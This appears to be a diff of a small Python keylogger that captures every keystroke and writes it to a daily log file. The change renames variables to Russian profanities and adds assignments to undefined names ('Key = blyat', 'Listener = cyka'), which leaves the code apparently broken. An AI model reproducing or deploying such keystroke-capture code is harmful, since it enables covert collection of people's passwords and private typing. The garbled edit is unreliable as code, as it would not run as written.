@@ -4,10 +4,13 @@ from datetime import datetime
 
 now = datetime.today().strftime('%Y-%m-%d')
 logg = now + ".txt" 
+Key = blyat
+Listener = cyka
 logging.basicConfig(filename=(logg), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+def on_press(blyat):
+    logging.info(str(blyat))
  
-def on_press(key):
-    logging.info(str(key))
- 
-with Listener(on_press=on_press) as listener :
-    listener.join()
+with cyka(on_press=on_press) as cyka :
+    cyka.join()
+  
